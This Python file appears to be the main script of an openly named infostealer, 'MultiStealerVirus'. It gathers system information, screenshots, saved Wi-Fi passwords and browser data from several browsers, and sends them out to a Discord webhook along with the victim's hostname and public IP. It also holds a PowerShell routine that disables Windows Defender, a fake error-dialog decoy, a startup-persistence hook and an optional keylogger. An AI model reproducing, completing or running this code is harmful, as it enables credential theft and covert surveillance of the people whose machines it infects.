from modules.browser import run
from modules.browser import delete_files
from modules.info import start
from modules.wifi import WifiPasswords
from modules.keylogger import Keylogger
from modules.startup import StartUp
#from modules.antidebug import Antidebug
from tkinter import messagebox
import os
import zipfile
import subprocess
import discord
from discord import File, SyncWebhook
import socket
import requests
#import config

#try:
#    AntiDebug = Antidebug()
#    AntiDebug.check()
#except:
#    pass

def disable_defender():
    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
    try:
        subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    except:
        pass
    
#disable_defender()

try:
    with open("todo.txt", "r") as f:
        lines = f.readlines()
        webhook = lines[0].strip()
        keylogger = lines[3].strip()
        Startup = lines[4]#.strip()
        f.close()
except:
    webhook = "null"
    Startup = "null"
    keylogger = "null"

def error():
    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
    
#error()


try:
    start()
except:
    pass

try:
    wifi = WifiPasswords()
    wifi.run()
except:
    pass

try:
    run()
except:
    pass

if Startup == "True":
    try:
        startup = StartUp()
        startup.run()
    except Exception as e:
        pass

def zip(name, files):
    try:
        with zipfile.ZipFile(name, "w") as zip:
            for file in files:
                try:
                    zip.write(file)
                except:
                    pass
    except:
        pass
    
zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png"])
delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])

zip_files = []

dir = os.getcwd()
for filename in os.listdir(dir):
    if filename.endswith(".zip") and filename != "System.zip":
        with zipfile.ZipFile(os.path.join(dir, filename), 'r') as zipfile_:
            if len(zipfile_.namelist()) != 0:
                zip_files.append(filename)
            #if len(zipfile_.namelist()) == 0:
            #    delete_files([os.path.join(dir, filename)])
            #else:
            #    zip_files.append(filename)


def send(url, files, text):
    try:
        webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
    except:
        return

    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        ip = "Unknown"

    embed = discord.Embed(
        title = text,
        description = f"{text} for: {socket.gethostname()}, {ip}",
        color = 0x10131c
    )

    file_dirs = files#["System.zip", "screenshot.png"]
    files = []

    for file in file_dirs:
        try:
            files.append(File(file))
        except:
            pass

    embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
    try:
        webhook.send(embed=embed, files=files)
    except:
        pass

try:
    send(webhook, ["System.zip", "screenshot.png"], "System Info")
    delete_files(["screenshot.png"])
except:
    pass

try:
    #send(webhook, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
    send(webhook, zip_files, "Browser Data")
except:
    pass


if keylogger == "True":
    try:
        keyLogger = Keylogger()
        keyLogger.run()
    except:
        pass
